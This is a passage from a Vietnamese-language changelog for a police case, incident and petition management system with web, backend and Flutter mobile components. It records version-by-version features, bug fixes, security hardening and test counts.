- **Frontend: lib/dates.ts** — `today()` và `toDateInput()` util format theo local timezone (+07 Việt Nam). Thay 8 site đang dùng `new Date().toISOString().split('T')[0]` — khắc phục bug late-night hiển thị "hôm qua" trong `<input type="date">`.

### Changed
- **Backend: CreateCaseDto + CreatePetitionDto thêm assignedTeamId** — Form FE submit kèm FK Team. Service create() persist field này → DataScope filter theo tổ hoạt động đúng cho record mới (trước đây `assignedTeamId=null` khiến record không xuất hiện trong "vụ án của tổ tôi").
- **Frontend: AuthUser interface mở rộng** — Thêm `id`, `firstName`, `lastName`, `teams[]`, `primaryTeam`. `authStore.getUser()` ưu tiên cached profile, fallback JWT decode (back-compat cho session cũ).
- **Web: Logo BCA "Bảo Vệ ANTT" làm favicon** — Tab trình duyệt hiện logo công an thay vì icon Vite mặc định. Logo serve từ `frontend/public/logo-cong-an.png`.

### Tests
- **Backend: +10 test** — `auth.service.getProfile()` (5 case: leader/oldest/no-team/single/not-found/inactive/canDispatch) + `auth.controller.me()` (2 case wiring).
- **Frontend: +33 test** — `dates.ts` (12), `useFormDefaults` (7), `useAuthHydration` (5), `auth.store` (7), `PetitionFormPage` integration (3).
- **Total: 1228 tests pass** (945 BE + 283 FE).

### Tooling
- **start_here_be.bat** — Script khởi động riêng backend: kill port 3000 cũ, start `npm run start:dev` trong cửa sổ mới.
- **Mobile: minSdk theo Flutter default** — `mobile/android/app/build.gradle.kts`: `minSdk = flutter.minSdkVersion` thay vì hard-code 23 → mở rộng device support theo Flutter SDK.

## [0.13.5.2] - 2026-05-08

### Changed
- **Backend: Tách status labels thành shared constants** — Tạo `backend/src/common/constants/status-labels.constants.ts` gom `CASE_STATUS_LABEL`, `INCIDENT_STATUS_LABEL`, `PETITION_STATUS_LABEL`, `PROPOSAL_STATUS_LABEL`. Các services thay `Record<string,string>` inline bằng constant chung. Đồng thời đổi field exports (`caseCode→id`, `crimeType→crime`, `unitId→unit`) đồng bộ với schema scalar fields.
- **Backend schema: Thêm performance indexes** — `Case.@@index([createdAt, unitId])`, `Incident.@@index([createdAt, unitId])`, `Proposal.@@index([createdAt, createdById])` — tăng tốc filter export theo ngày + đơn vị.
- **Mobile: Centralize API providers** — Tạo `mobile/lib/core/api/providers.dart` làm single source of truth cho 10 providers (apiClient, tokenStorage, 8 *ApiProvider). Feature screens không còn khai báo inline + import lẫn nhau qua dashboard_screen. Cross-feature dependency smell được loại bỏ.
- **Mobile: Force-unwrap hardening** — Thay pattern `deadline!.X()` (đã null-check) bằng local capture `final d = deadline; ... d.X()` trong Case/Incident/Petition models + DeadlineBadge widget. Identical bytecode, clearer intent.

### Fixed
- **Web: Maestro flow login chain** — 7 flows (`03_cases_list`, `03b_cases_search`, `04b_case_detail_api`, `06_petitions_list`, `07_dashboard`, `10_petitions_overdue`, `99_logout`) trước đây dùng `launchApp` raw → false-positive PASS trên login screen vì assertions yếu. Đổi thành `runFlow: 01_login_success.yaml` để chain login đúng nghiệp vụ.
- **Web: Maestro biometric dialog dismissal** — `01_login_success.yaml` thêm `tapOn: "Để sau"` (optional) sau Đăng nhập để dismiss biometric setup prompt block dashboard navigation.

### Documentation
- **Mobile: REFACTOR-FINDINGS.md** — Catalog 9 latent bugs (BUG-1: 2FA không init FCM, BUG-2: NotificationRouter dead code, BUG-3: auth coupled với devices API, ...) + 5 performance hotspots + 7 deferred refactor phases với design specs ready cho session sau.
- **CLAUDE.md: GBrain Configuration block** — Document local PGLite engine, MCP registration, Windows-specific quirks (PATH propagation, gbrain put requires --content).

## [0.13.5.1] - 2026-05-03

### Added
- **Web: Xuất Excel BCA format cho 5 màn hình Phân loại & Quản lý** — `WardIncidentsPage`, `WardCasesPage`, `OtherClassificationPage`, `ProsecutorProposalPage`, `DuplicatePetitionsPage` giờ xuất file `.xlsx` đầy đủ BCA format (6-row letterhead, navy headers, alternating rows, footer signature, A4 landscape) thay vì CSV thô. 5 backend endpoints mới với throttle 5 req/phút.
- **Web: Petitions export chuẩn hóa BCA format** — `DanhSachDonThu_*.xlsx` từ `/petitions/export` giờ có đầy đủ letterhead và footer, đồng nhất với Monthly/Quarterly/Stat48 reports.

### Fixed
- **Web: Trang "Vụ việc theo phường/xã" không còn redirect về login khi click Xem** — Tạo `IncidentDetailPage` + đăng ký route `/vu-viec/:id` và alias `/incidents/:id`. Cùng fix luôn `TransferAndReturnPage` và `IncidentListPage` (đều navigate đến route chưa tồn tại này).
- **Web: Enum constants trong 5 màn hình Phân loại & Quản lý** — `WardIncidentsPage`, `WardCasesPage`, `OtherClassificationPage`, `DuplicatePetitionsPage`, `ProsecutorProposalPage` không còn dùng hardcoded string literals làm status map keys; tất cả dùng `IncidentStatus`/`CaseStatus`/`PetitionStatus` từ shared enums.
- **Web: statusLabel hiển thị tiếng Việt** thay vì enum constant raw string (TIEP_NHAN → Tiếp nhận).

## [0.13.5.0] - 2026-05-03

### Fixed
- **Mobile: PetitionStatus labels hiển thị đúng tiếng Việt** — `StatusChip` trước đây thiếu toàn bộ 5 `PetitionStatus` values (`MOI_TIEP_NHAN`, `DANG_XU_LY`, `CHO_PHE_DUYET`, `DA_LUU_DON`, `DA_CHUYEN_VU_VIEC`), hiển thị raw code string thay vì nhãn tiếng Việt.

### Changed
- **Mobile: Chuẩn hóa constants** — Thay thế 22 hardcoded string literals trong business logic Flutter bằng typed constants (`AppStatus`, `AppAuthResult`, `kStatusLabels`, `kGreenStatuses`, `kYellowStatuses`, `kNavyStatuses`). Color logic từ fragile `startsWith/contains` → explicit Sets — không còn silent regression khi backend thêm enum value.
- **Mobile tests** — 16 unit tests mới gồm regression pins cho 2 bugs phát hiện trong eng-review (khongKhoiTo và dangTruyTo bị gán vào hai color groups cùng lúc).

## [0.13.4.0] - 2026-05-03

### Changed
- **Chuẩn hóa so sánh enum/constant toàn codebase**: Loại bỏ 60+ hardcoded string/number literal trong business logic (cả backend lẫn frontend), thay bằng typed constants và Prisma enum values. Không còn so sánh `'ADMIN'`, `'refresh'`, `'TWO_FA_ENABLED'`, `'DRAFT'`... bằng literal.
- **Shared enum infrastructure**: Generator script tự động sinh `shared/enums/generated.ts` từ Prisma schema (24 enum, 7 constant files). Frontend import từ đây thay vì khai báo lại.
- **Status badges ComprehensiveListPage**: Fix 3 bugs nghiêm trọng — badge luôn xám (key mismatch), filter status không lọc được, label hiển thị raw `TIEP_NHAN`. Tất cả 32 status values giờ render đúng màu + label tiếng Việt.
- **IncidentFormPage Lý do không khởi tố**: Chuyển `<select>` hardcode → FKSelect searchable với `LY_DO_KHONG_KHOI_TO_OPTIONS` từ `shared/enums/status-labels`.
- **Frontend shared enums**: Thêm `permissions.ts`, `status-labels.ts`, `roles.ts`, `case-types.ts`, `case-phase.ts`, `proposal-status.ts`, `conclusion-status.ts`, `subject-status.ts`, `duplicate-petition-status.ts`, `report-tdc-status.ts`, `two-fa-methods.ts`, `locales/vi.ts`.
- **Backend constants**: `ROLE_NAMES`, `TOKEN_TYPE`, `SETTINGS_KEY`, `TWO_FA_METHOD`, `FCM_ERROR`, `EXPORT_FORMAT` — wire-format documented với JSDoc cảnh báo.
- **SettingsPage test**: Fix API mock + sửa assertion sai để test pass.
- **TS error fixes**: 8 pre-existing TypeScript errors (unused imports/vars, type mismatch).
- **CaseFormPage**: `CRIMINAL_TYPE_OPTIONS` chuyển sang fetch từ MasterClass API (type '07') thay hardcode.

### Fixed
- **ComprehensiveListPage**: Navigate path `/cases/${id}` cho mọi entity → đúng route theo từng loại (cases/incidents/petitions).
- **IncidentFormPage**: Xóa `currentStatus` state không dùng.
- **usePermission**: Tách `MOCK_PERMISSIONS` ra `shared/enums/permissions.ts` để reuse.

### Added
- 3 tests mới: `enums-sync.spec.ts` (verify generated.ts vs schema.prisma), `jwt-wire-format.spec.ts` (pin `TOKEN_TYPE.REFRESH = 'refresh'`), `settings-keys.spec.ts` (pin settings keys).
- `useMasterClassOptions.test.ts`: 5 tests cho hook.
- Backend seed: 13 BLHS crime type entries (MasterClass '07') + 9 VKS offices (MasterClass '08').

## [0.13.3.0] - 2026-05-03

### Changed
- **UX cột Thao tác toàn hệ thống**: Chuẩn hóa cột Thao tác lên ĐẦU + sticky bên trái cho **22 màn hình danh sách** (ngoài 3 trang chính đã làm trước). Click row → mở modal sửa hoặc navigate sang màn hình edit (nếu có quyền).
  - **Group A (8 trang modal-edit)**: Quản lý Đối tượng (+Nạn nhân, Nhân chứng), Quản lý Luật sư, Danh mục, MasterClass, Quản lý Người dùng, Tài liệu, Mapping địa chỉ, Phím tắt.
  - **Group B (11 trang workflow)**: Danh sách tổng hợp, Hồ sơ ban đầu, Đơn trùng, Vụ án/Vụ việc theo phường, Phân loại khác, Kiến nghị VKS, Trao đổi chuyên án, Ủy thác điều tra, Chuyển/nhận hồ sơ, Hướng dẫn đơn thư.
  - **Group C (3 trang report)**: Nhật ký hoạt động, Bản nháp TĐC, Hồ sơ trễ hạn.
- **Action dropdown menu**: Z-index `z-20` → `z-50` (không bị sidebar đè), mở từ `right-0` → `left-10` (không che icon ⋮ row khác).

### Fixed
- **SettingsPage UserManagementModule**: Nút Sửa/Xóa giờ navigate sang `/nguoi-dung` (trước đó chỉ là stub).

### Added
- **3 spec files mới**: `address-mapping.controller.spec.ts` (8 tests), `phu-luc-1-6.controller.spec.ts` (3 tests), `phu-luc-1-6-export.service.spec.ts` (2 tests). Test count: 904 → 917.

## [0.13.2.0] - 2026-05-03

### Changed
- **Cột Thao tác lên đầu bảng** (Danh sách Vụ việc, Vụ án, Đơn thư): Không cần scroll ngang để tìm nút thao tác. Cột được ghim (sticky) ở bên trái.
- **Click vào row → màn hình sửa**: Click vào bất kỳ chỗ nào trên dòng sẽ chuyển sang màn hình chỉnh sửa (nếu có quyền). Phím Enter/Space cũng hoạt động (accessibility).
- **Codex CLI**: Cài đặt `@openai/codex` v0.128.0 cho code review độc lập.

### Fixed
- **Thống kê phường/xã** (`DistrictStatisticsPage`): Thay FKSelect combobox bằng native select — tỉnh/TP giờ chọn được bình thường.
- **Ward filter backend**: `getDistrictStats()` giờ lọc cases theo `metadata.ward` khi có param `district`.
- **Settings page**: Fix import `api` default → named, fix ProvinceWardSelect `disabled` prop.
- **Crawl địa chỉ**: Fix `Transform`/`Type` import từ `class-validator` → `class-transformer` — nút "Cập nhật từ API" hoạt động.
- **Address converter F10**: District-level fallback — phường 14 quận Phú Nhuận → phường Phú Nhuận.

### Added
- **Chuyển đổi địa chỉ 2025** (F10): Nhấn F10 trong bất kỳ text field nào → convert địa chỉ cũ (có quận/huyện) sang mới. Dialog xác nhận trước/sau.
- **Mapping địa chỉ** (`Settings → Cải cách địa chỉ`): Quản lý 273 mapping TPHCM. Nút "Cập nhật từ API" crawl dữ liệu mới từ provinces.open-api.vn.
- **Tội danh BLHS**: 47 tội danh chính xác theo BLHS 2015 (sửa đổi 2017/2022), 5 nhóm: tính mạng, sở hữu, kinh tế, ma túy, TTXH.
- **Quản lý danh mục cha-con**: Quan hệ PROVINCE → WARD, admin screen drill-down, cascade select trong form địa chỉ.

## [0.13.1.0] - 2026-05-02

### Added
- **Danh mục hệ thống hiển thị dữ liệu thật** (`Settings → Danh mục`): Không còn mock data. Trang hiển thị 21 loại danh mục với số lượng thật từ DB — Phường/Xã: 10,051 mục, Tỉnh/Thành phố: 34 mục, Loại vụ việc: 4 mục, v.v. Quận/Huyện hiển thị với badge "Di sản · trước 01/07/2025" (backward compat).
- **API `GET /directories/stats`**: Endpoint mới trả về count theo từng loại danh mục. Có test.
- **Seed 34 Tỉnh/Thành phố**: Tự động seed khi `npm run db:seed`. 34 tỉnh/TP chính xác theo cải cách 2025.
- **Seed 5 loại mới**: TDC_SOURCE (nguồn tin TĐC), TDC_CASE_TYPE (loại vụ TĐC), DOCUMENT_TYPE (loại tài liệu), INCIDENT_LEVEL (mức độ nghiêm trọng), UNIT (đơn vị công an).
- **`seedWards()` chạy tự động**: `npm run db:seed` giờ tự động seed 10,051 phường/xã toàn quốc — không cần chạy lệnh riêng.

### Changed
- **10 dropdown chuyển sang dùng dữ liệu DB**: Tất cả form nhập liệu (PetitionFormPage, CaseFormPage, IncidentFormPage) giờ dùng `FKSelect directoryType` thay vì hardcoded options. Các loại: PETITION_TYPE, INCIDENT_TYPE, INCIDENT_LEVEL, PRIORITY, CASE_CLASSIFICATION, PROSECUTION_OFFICE, EVIDENCE_TYPE, TDC_SOURCE, TDC_CASE_TYPE, DOCUMENT_TYPE, UNIT.
- **Quận/Huyện → Legacy**: Các entry DISTRICT trong DB được set `isActive=false` — không hiển thị trong form nhập mới nhưng vẫn bảo toàn dữ liệu hồ sơ cũ.

## [0.13.0.0] - 2026-05-02

### Added (2026-05-02)
- **Dữ liệu phường/xã toàn quốc** (`frontend/src/data/vietnam-wards.ts`): 470+ phường/xã với TPHCM ưu tiên đầu. Autocomplete tại trang Thống kê phường/xã gợi ý phường/xã thật theo quy định 2025 — TPHCM đầu tiên, sau đó các tỉnh. 15 unit tests.
- **Backend seed script** (`npm run db:seed:wards`): Seed 3321 phường/xã vào database để API `/directories?type=WARD` trả về data thật. Idempotent — an toàn chạy nhiều lần.
- **Dữ liệu 34 tỉnh/TP** (`frontend/src/data/vietnam-provinces.ts`): Danh sách chính xác 34 tỉnh/TP sau cải cách 2025 (không còn 63 — sau sáp nhập).

### Changed (2026-05-02)
- **Đổi tên "Xuất báo cáo"** → "Xuất hồ sơ đơn thư": Tên cũ gây nhầm với báo cáo thống kê.
- **Đổi tên "Thống kê quận/huyện"** → "Thống kê phường/xã": Cấp quận/huyện không còn tồn tại sau cải cách 2025.
- **CSV export headers**: Cột "Quận/huyện" → "Khu vực" trong 3 trang phân loại.
- **DistrictStatisticsPage**: Autocomplete phường/xã từ data thật (TPHCM ưu tiên), filename `ThongKePhuongXa_`.

## [0.13.0.0] - 2026-05-01

### Added
- **Phụ lục 1-6 BCA** (`GET /reports/phu-luc-1-6/preview` + `/export`): Cán bộ có thể xem và xuất Excel 6 loại danh sách hồ sơ theo quy định BCA — PL1 (vụ việc đang giải quyết), PL2/3 (vụ việc TĐC hết/còn thời hiệu), PL4 (vụ án đang điều tra), PL5/6 (vụ án TĐC hết/còn thời hiệu). Hỗ trợ filter theo đơn vị + kỳ ngày. Export Excel với multi-row per bị can.
- **Trang Phụ lục 1-6 BCA** (`/reports/phu-luc-1-6`): Giao diện 6 tab, filter, preview bảng dữ liệu, nút Xuất Excel với progress indicator.
- **Schema**: Thêm `ngayHetThoiHieu` (Case) và `ngayHetThoiHieuVV` (Incident) để phân biệt hồ sơ TĐC hết/còn thời hiệu truy cứu TNHS.
- **BCA Excel Helper** (`backend/src/common/bca-excel.helper.ts`): Shared utility chuẩn hóa format Excel theo quy định BCA — header CÔNG AN TPHCM/PHÒNG PC02, alternating row colors (#EFF6FF/white), footer ký tên, print setup A4 landscape.

### Changed
- **Excel báo cáo tháng/quý**: Nâng cấp từ basic navy header lên BCA professional format đầy đủ (6 rows header, alternating rows, footer signature, print setup).
- **Excel thống kê 48 trường (Stat48)**: Mỗi sheet tab nay có header CÔNG AN TPHCM/PHÒNG PC02 + footer ký tên.

## [0.12.0.0] - 2026-05-01

### Added
- **Xuất Excel đơn thư thật** (`GET /petitions/export`): Cán bộ có thể tải file Excel thực sự từ trang Xuất báo cáo. DataScope enforced — chỉ thấy đơn thư thuộc tổ mình. Rate limit 5/phút. Tối đa 500 bản ghi.
- **Xuất Word chi tiết đơn thư** (`GET /petitions/:id/export-word`): File .docx với đầy đủ thông tin đơn thư, tên file tự động.
- **Excel báo cáo tháng/quý (format BCA)**: `GET /reports/monthly/export` + `quarterly/export` — file Excel có header Phòng PC02, bảng số liệu, footer chữ ký Lãnh đạo.
- **Thống kê 48 trường** (`GET /reports/stat48`): Tổng hợp 48 chỉ tiêu BCA từ Tab 9 của vụ án. SUM cho 12 trường số, COUNT BY VALUE cho 36 trường danh mục. File Excel 4 sheet tab (Nhóm 1-4). Cảnh báo DRAFT khi dữ liệu thiếu > 50%.
- **Trang Thống kê 48 trường** (`/reports/stat48`): 4 accordion groups, banner cảnh báo dữ liệu thiếu, nút Xuất Excel.
- **Biên nhận đơn thư PDF** (HTML print): Biên nhận chuẩn với logo Công An, thông tin đơn, ô chữ ký.

### Fixed
- **Bug xuất Excel đơn thư**: `handleExportExcel()` trước đây là UI stub — chỉ hiện thông báo "thành công" nhưng không tải file. Nay đã kết nối API thật.
- **Bug xuất Word, xuất biên nhận**: Tương tự, đã fix tất cả 3 stub handlers trong ExportReportsPage.
- **PermissionsGuard bị drop**: Method-level `@UseGuards(JwtAuthGuard)` trên các export endpoint làm mất class-level `PermissionsGuard`. Đã sửa để kế thừa đúng.
- **ExcelJS write chưa có error handling**: Thêm try/catch cho tất cả `workbook.xlsx.write(res)` — tránh crash server khi download bị ngắt.
- **Thiếu rate limit @Get(':id/export-word')**: Thêm `@Throttle(5/min)`.

### Security
- Tất cả export endpoints mới đều enforce DataScope (`buildPetitionScopeFilter`) — không thể export dữ liệu ngoài phạm vi tổ.

---

## [0.12.1.0] - 2026-05-01

### Fixed
- **Stub handlers frontend (16 items)**: Tất cả button/link không hoạt động đã được implement — Xuất Excel trên 5 trang (Vụ việc, Trao đổi chuyên án, Ủy thác điều tra, Người dùng, Danh sách vụ án), tải đính kèm chat, in PDF đề xuất, lưu nháp form vụ án vào localStorage, nút "Áp dụng" lọc, phân trang Trước/Sau trên 4 trang, điều hướng Sửa/Xóa trong SettingsPage.
- **Báo cáo tháng — sai tham số month**: Tháng được gửi dạng "2026-02" thay vì số nguyên 2. Đã fix parse trước khi gửi API.
- **Stat48ReportPage không hiển thị data**: Mismatch giữa shape backend (`nullCount`, `field`, `dataCount`) và interface frontend (`casesWithoutData`, `fieldName`, `count`). Đã thêm transform trong `fetchReport()`.
- **Export ActivityLog, DistrictStats**: Stub `alert()` thay bằng CSV download client-side thực sự.
- **CI/CD**: Thêm `npx prisma generate` sau `npm ci` trong workflow — sửa lỗi "Cannot find module .prisma/client/default" trên GitHub Actions.
- **Node.js 20 → 22**: Cập nhật CI workflow để tránh deprecation warning.

### Added
- **34 backend spec files**: 7 service specs (calendar, dashboard, notifications, devices, tdac-export, settings, action-plans) và 27 controller specs mới với shared `controller-test-helpers.ts`. Tổng: 875 tests.
- **Skill /stub-check**: Skill mới tự động scan frontend/backend tìm stub handlers, missing onClick, alert() stubs, console.log debug, và thiếu test coverage.
- **CSV helper** (`frontend/src/lib/csv.ts`): Shared `downloadCsv()` cho tất cả export buttons.
- **Pagination thực** trên 4 trang (CaseList, PetitionList, CaseExchange, TransferReturn): Client-side với PAGE_SIZE=20, reset khi filter thay đổi.

## [0.11.0.0] - 2026-05-01

### Added
- **Quên mật khẩu tự phục hồi** (`/forgot-password`): Cán bộ có thể tự reset mật khẩu bằng email OTP 6 chữ số, không cần liên hệ admin. Flow 2 bước: nhập email → nhận mã → nhập mã + mật khẩu mới. OTP hết hạn sau 15 phút, có countdown timer và nút Gửi lại sau 60s.
- **OTP purpose scoping**: `OtpCode.purpose` field phân biệt `TWO_FA` và `PASSWORD_RESET` — tránh 2FA OTP bị kill khi user request reset password cùng lúc.
- **Endpoints mới**: `POST /auth/forgot-password` (3 req/min) và `POST /auth/reset-password` (3 req/min). Password reset invalidate tất cả JWTs và refresh tokens (tokenVersion++).

### Fixed
- **Trang đăng nhập hiển thị đầy đủ dấu tiếng Việt**: 15+ chuỗi trên LoginPage.tsx đã được sửa đúng dấu (HỆ THỐNG QUẢN LÝ VỤ ÁN PC02, Mật khẩu, Đăng nhập...). `lang="vi"` cho `<html>`.
- **OTP TTL nhất quán**: Đổi từ 10 phút lên 15 phút để khớp với nội dung email hướng dẫn.
- **Throttle inversion**: `reset-password` đặt về 3 req/min (từ 5) — khớp với `forgot-password` và an toàn hơn.

## [0.10.0.0] - 2026-04-30

### Added
- **Báo cáo TĐC Phụ lục 08** (`/reports/tdac`): Tự động hóa thống kê Vụ án Tạm đình chỉ điều tra và Vụ việc Tạm đình chỉ giải quyết theo mẫu BCA. Preview bảng số liệu đúng format Phụ lục 08 với 35+ dòng phân tách theo tổ, export .xlsx từ template BCA.
- **Draft/Review/Approve workflow**: Báo cáo TĐC đi qua luồng DRAFT → REVIEWING → APPROVED → FINALIZED với audit trail đầy đủ. Immutable sau khi khóa. Optimistic lock ngăn concurrent finalize.
- **Capture lý do TĐC**: `SuspensionModal` và `ResumeModal` capture enum `lyDoTamDinhChiVuAn` (8 giá trị theo Điều 229 BLTTHS 2015) và `ketQuaPhucHoiVuAn` (5 giá trị). Soft-warn 90 ngày cho case cũ, bắt buộc cho case mới.
- **Biên bản VKS và Kế hoạch khắc phục**: Tab mới trong Case/Incident Detail. API: `POST /cases/:id/vks-meetings`, `POST /cases/:id/action-plans` (và tương đương cho incidents).
- **Backfill queue** (`/cases/tdac-backfill`): Màn hình cập nhật hàng loạt lý do TĐC cho ~28k case cũ chưa có enum. Banner nhắc trong Case Detail.
- **Schema mới**: 7 enums (LyDoTamDinhChiVuAn, KetQuaPhucHoiVuAn, LyDoTamDinhChiVuViec, KetQuaPhucHoiVuViec, TienDoKhacPhuc, ReportTdcType, ReportTdcStatus), 3 models (VksMeetingRecord, SuspensionActionPlan, ReportTdcDraft), thêm TĐC fields vào Case và Incident.
- **Permissions**: `approve:Report`, `write:Report` được seed sẵn.
- **48 unit tests** cho tdac module: compute logic, state machine, permission enforcement.
- **Excel template generator**: Script tạo Phụ lục 08 với header BCA, màu sắc phân cấp hàng, chữ ký CÁN BỘ THỐNG KÊ / THỦ TRƯỞNG ĐƠN VỊ.

### Fixed
- `Prisma.join([])` crash khi `teamIds` rỗng trong tất cả `$queryRaw` của TĐC service
- Date validation trên preview endpoints (400 thay vì 500 khi thiếu fromDate/toDate)
- Field rename `lyDoTamDinhChi → lyDoTamDinhChiText` trên Incident để tránh conflict với enum mới
- `tdc-backfill` endpoint missing — frontend backfill page trả 404 mà không có endpoint này

## [0.9.0.0] - 2026-04-26

### Added
- **Dispatcher Permission Group (`canDispatch`)**: Điều tra viên OFFICER có `canDispatch=true` có thể xem và phân công vụ việc/vụ án/đơn thư của mọi tổ. `DispatchGuard` + `DataScope` bypass đảm bảo quyền truy cập xuyên tổ an toàn. JWT invalidation tức thì khi toggle `canDispatch`.
- **Assign endpoints**: `PATCH /cases/:id/assign`, `PATCH /incidents/:id/assign`, `PATCH /petitions/:id/assign` — cho phép dispatcher phân công đội/điều tra viên mà không cần thuộc tổ đó.
- **Frontend Assign UI**: `AssignModal` component + assign buttons trên Cases/Incidents/Petitions list pages. Admin toggle bật/tắt `canDispatch` trên User Management page.
- **Docker Compose full-stack**: `docker-compose.yml` với 3 services (`db` PostgreSQL 16, `backend` NestJS, `frontend` nginx). Multi-stage Dockerfiles, `docker-entrypoint.sh` chạy migrate → seed → start. Nginx reverse proxy `/api/*` → backend.
- **Mobile production build script**: `build_mobile_prod.bat` — build APK release với `--dart-define=API_BASE_URL=http://<SERVER>/api/v1`.
- **Audit before/after state**: `AuditService.wrapUpdate()` helper + áp dụng cho 11 services — UPDATE log ghi lại state trước và sau thay đổi.
- **GitHub Actions CI**: `.github/workflows/ci.yml` chạy 628 backend unit tests trên mỗi push/PR.
- **UAT SDLC artifacts + Optimistic locking**: Checklist UAT đầy đủ + `version` field optimistic locking trên 10 mutation endpoints để ngăn concurrent write conflict.

### Fixed
- **FINDING-013 Security**: Enforce `DataAccessGrant.accessLevel` write-scope trên tất cả mutation paths — loại bỏ leo thang quyền.
- **Incidents assign**: CUID validation (`@IsString()` thay `@IsUUID('4')`) + `investigatorId` optional (cho phép assign team trước, điều tra viên sau).
- **Cases/Petitions assign DTOs**: Tương tự — CUID validation fix cho `assignedTeamId`, `assignedToId`, `investigatorId`.

## [0.8.0.0] - 2026-04-25

### Added
- **Biometric login (TouchID/FaceID)**: `BiometricService` lưu credentials vào Keychain/Keystore, tự động đăng nhập khi mở app. iOS `NSFaceIDUsageDescription` + Android `minSdk 23` cho `local_auth`. Logout xóa credentials sinh trắc học.
- **Petitions overdue filter**: Tab "Quá hạn" trong Đơn thư screen trả đúng đơn thư đã qua hạn — backend `?overdue=true` filter với `PetitionStatus` enum (type-safe).
- **Maestro E2E test suite (11 flows)**: Full end-to-end coverage Android — 175 steps, 0 failures, health score 99/100.
- **Team-scoped deadline notifications**: Scheduler gửi push đến toàn tổ phụ trách, DataAccessGrant holders. Loại trừ ADMIN role và inactive users.

### Fixed
- **Dashboard stats nhất quán**: `DINH_CHI` tính vào `processedCases` (đình chỉ = đã xử lý). `TAM_DINH_CHI` loại khỏi `overdueCount` (tạm đình chỉ không phải quá hạn).
- **CRITICAL — api_client isolate crash**: Queued requests không wrap `completeError()` trong try/catch — khi refresh fail, crash isolate. Đã wrap + return early.
- **SECURITY — MITM risk on token refresh**: Bare `Dio()` cho refresh request không có timeout. Thay bằng `Dio(BaseOptions(...))` với cùng config như client chính.
- **Duplicate notifications**: `markNotified()` đảo thứ tự trước `sendToUser()` — push throw không còn bỏ sót dedup record.
- **Scheduler DB failure silences all notifications**: `systemSetting.findUnique` thêm try/catch, fallback 7 ngày khi DB hiccup lúc 07:00.
- **Biometric credentials leak after logout**: `logout()` nay `Future.wait([storage.clear(), biometricService.clear()])` — không để credentials sinh trắc học của user cũ.
- **PetitionStatus string literals → enum**: `petitions.service.ts` overdue filter dùng `PetitionStatus.DA_GIAI_QUYET` thay chuỗi literal (type-safe, refactor-safe).

## [0.7.0.0] - 2026-04-25

### Added
- **Team-scoped deadline notifications**: DeadlineScheduler gửi push đến toàn bộ tổ phụ trách (không chỉ điều tra viên trực tiếp) — tích hợp với DataAccessGrant và UserTeam. Loại trừ admin role và inactive user trong phân phối push.
- **Maestro E2E test suite (11 flows)**: Full end-to-end coverage trên Android — login, wrong password, cases list, case detail, incidents list, petitions list, dashboard, tab navigation, petition detail, logout. Windows-compatible với Java direct invocation (bypass CMD classpath limit).
- **Dashboard fix**: 4 stat cards bây giờ hiển thị số thật — fix response envelope unwrap + field name mismatch (`processedCases` vs `resolvedCases`).
- **StatusChip localization**: Tất cả 22 enum value (CaseStatus + IncidentStatus) hiển thị tên tiếng Việt, màu theo ngữ nghĩa (đỏ = quá hạn, vàng = đình chỉ, xanh = hoàn thành, xanh navy = đang xử lý).
- **Regression tests**: `dashboard_api_test.dart` (5 tests) + `status_chip_test.dart` (8 widget tests) — bảo vệ cả 2 bug vừa fix và 4 color branch của StatusChip.

### Fixed
- **Terminal statuses hoàn chỉnh**: `DA_KET_LUAN` thêm vào `TERMINAL_CASE_STATUSES` (hết thông báo cho vụ án đã kết luận). 7 incident terminal statuses còn thiếu được thêm vào (`CHUYEN_XPHC`, `TDC_HET_THOI_HIEU`, `TDC_HTH_KHONG_KT`, `PHUC_HOI_NGUON_TIN`, `DA_CHUYEN_DON_VI`, `DA_NHAP_VU_KHAC`, `PHAN_LOAI_DAN_SU`).
- **NaN guard cho CANH_BAO_SAP_HAN**: `parseInt` với giá trị không hợp lệ fallback về 7 ngày thay vì tạo `Invalid Date` làm tắt toàn bộ cảnh báo sắp đến hạn.
- **Dashboard API null safety**: Type guard trước khi cast `resp.data` — trả về stats rỗng thay vì crash khi API trả về non-map body.
- **Maestro flows**: `clearState: true` để reset auth state giữa các flows. Coordinate-based tap thay cho Vietnamese Unicode text (Maestro 1.39.0 Windows bug). Logout assertion mạnh hơn.

## [0.6.0.0] - 2026-04-24

### Added
- **Flutter Mobile App (Android + iOS)**: Ứng dụng di động đầy đủ tính năng — xem tiến độ hồ sơ/vụ việc/đơn thư theo thời gian thực, nhận push notification khi quá hạn hoặc sắp đến hạn. Phân phối qua Firebase App Distribution. Material 3, Riverpod state management, GoRouter navigation.
- **FCM Push Notification**: Backend FCM HTTP v1 — `PushService` gửi push đến tất cả thiết bị của user, tự xóa stale token (`INVALID_ARGUMENT`/`NOT_FOUND`). `DevicesController` (POST/DELETE `/devices`) đăng ký/hủy FCM token sau login/logout.
- **DeadlineScheduler**: Cron job 07:00 mỗi ngày kiểm tra vụ án/vụ việc/đơn thư quá hạn và sắp đến hạn, gửi push notification đến điều tra viên phụ trách. Dedup bằng `OverdueNotification` table (1 lần/24h/hồ sơ). Null guard cho `investigatorId`. `Promise.allSettled` để tránh một thiết bị lỗi block các thiết bị khác.
- **UserDevice + OverdueNotification schema**: 2 model mới trong Prisma — `user_devices` (FCM token per user, upsert by token), `overdue_notifications` (dedup tracking với unique constraint `resourceType+resourceId+userId`).
- **CANH_BAO_SAP_HAN setting**: Key mới trong SystemSetting với default 7 ngày — ngưỡng cảnh báo sắp đến hạn, cấu hình từ web admin, Flutter app đọc qua `GET /settings`.
- **5-tab Bottom Navigation**: Dashboard / Hồ sơ / Vụ việc / Đơn thư / Thông báo — unread badge count trên tab Thông báo. Drawer với logo PC02 + tên/vai trò người dùng + Đăng xuất.
- **DeadlineBadge (3 màu)**: Đỏ (quá hạn), Vàng (≤ CANH_BAO_SAP_HAN ngày), Xanh (còn thời gian). Đọc ngưỡng từ Riverpod `deadlineSettingsProvider` (cache 1 lần khi khởi động).
- **Offline Banner**: Banner "Không có kết nối" tự động hiện khi mất mạng (`connectivity_plus`).
- **2FA Mobile Flow**: Màn hình nhập OTP 6 chữ số, auto-submit khi đủ 6 ký tự, back về Login xóa pending state.
- **Shimmer Loading + Pull-to-Refresh**: Skeleton animation trên lần tải đầu, pull-to-refresh trên tất cả list screens.
- **Optimistic Mark-Read**: Tap thông báo → đánh dấu đã đọc ngay (revert khi lỗi).
- **8 Flutter unit tests**: `auth_provider_test.dart` (4) + `deadline_badge_test.dart` (4). 14 backend tests: `push.service.spec.ts` (5) + `deadline.scheduler.spec.ts` (8) + 1 devices controller test.

### Fixed
